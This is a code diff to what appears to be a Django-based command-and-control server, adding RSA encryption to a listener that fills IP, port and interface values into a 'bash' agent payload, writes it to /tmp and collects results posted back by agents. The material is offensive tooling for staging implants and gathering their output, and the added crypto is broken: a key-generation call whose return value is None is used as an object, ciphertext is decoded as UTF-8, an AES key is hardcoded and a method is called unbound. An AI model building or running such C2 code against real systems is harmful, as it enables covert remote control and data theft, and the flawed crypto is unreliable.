@@ -21,7 +21,8 @@ import base64
 import os
 import hashlib
 from Crypto import Random
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES , PKCS1_OAEP
+from Crypto.PublicKey import RSA
 
 current_path= os.path.dirname(os.path.abspath(__file__))
 
@@ -112,6 +113,52 @@ def DECRYPT(ENC, KEY):
     dec = c.decrypt(ENC)
     return dec
 
+#RSA Encryption Class
+class RsaEncryption(View):
+    def __init__(self):
+        super().__init__()
+        # Generate an RSA key pair if it doesn't exist
+        # try:
+        #     with open('private_key.pem', 'rb') as f:
+        #         self.private_key = RSA.import_key(f.read())
+        # except FileNotFoundError:
+        #     self.private_key = RSA.generate(2048)
+        #     with open('private_key.pem', 'wb') as f:
+        #         f.write(self.private_key.export_key())
+        # self.public_key = self.private_key.publickey()
+
+	# Generate an RSA key pair
+    def generate_key_pair(self):
+        self.private_key = RSA.generate(2048)
+        self.public_key = self.private_key.publickey()
+    
+    # return public key
+    def get_public_key(self):
+        return self.public_key
+    
+	# Encrypt data using the public key
+    def encrypt_with_public_key(self, data):
+        cipher = PKCS1_OAEP.new(self.public_key)
+        ciphertext = cipher.encrypt(data)
+        return ciphertext.decode('utf-8')
+        # removed base64 encoding as in linux functions its implemented and no encoding in windows
+        # return base64.b64encode(ciphertext).decode('utf-8')
+
+	# Recieve ciphertext and decrypt using the private key
+    def decrypt_with_private_key(self, ciphertext): 
+        # removed base64 decoding as in linux functions its implemented and no encoding in windows
+        # ciphertext = base64.b64decode(ciphertext)
+        cipher = PKCS1_OAEP.new(self.private_key)
+        data = cipher.decrypt(ciphertext)
+        return data.decode('utf-8')
+
+	# Encrypt the AES key using the public key (optional and depends on the key transferring method)
+    def get(self, request):
+        aes_key = b'mysecretkey'
+        encrypted_aes_key = self.encrypt_with_public_key(aes_key)
+
+        # Return the encrypted AES key in the response
+        return HttpResponse(encrypted_aes_key)
 
 class Listener():
     class PostListener(View):
@@ -187,11 +234,14 @@ class Listener():
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
             output_path= "/tmp/{}".format(eth)
+            key_gen = RsaEncryption().generate_key_pair()
+            public_key=key_gen.get_public_key()
             with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
+            payload = payload.replace('REPLACE_PUB_KEY',public_key)
             with open(output_path,"wt") as R:
                 R.write(payload)
 
@@ -273,7 +323,7 @@ class Listener():
             else:
                 return HttpResponse('')
 
-#Receive results from the Agent then put it in result file
+        #Receive results from the Agent then put it in result file
         def receiveResults(request,name=''):
                 resultspath = listen_path+"agents/{}/results".format(name)
                 if request.method == 'POST':
@@ -291,6 +341,7 @@ class Listener():
                 else:
                     return HttpResponse('')
 
+        #Recieve, decode and decrypt results from agent
         def LinreceiveResults(request,name=''):
             resultspath = listen_path+"agents/{}/results".format(name)
             if request.method == 'POST':
@@ -298,6 +349,7 @@ class Listener():
                 base64_bytes = result.encode('ascii')
                 message_bytes = base64.b64decode(base64_bytes)
                 result = message_bytes.decode('ascii')
+                result = RsaEncryption.decrypt_with_private_key(result)
                 with open(resultspath,'a') as r:
                     r.write(result) 
                     r.close()
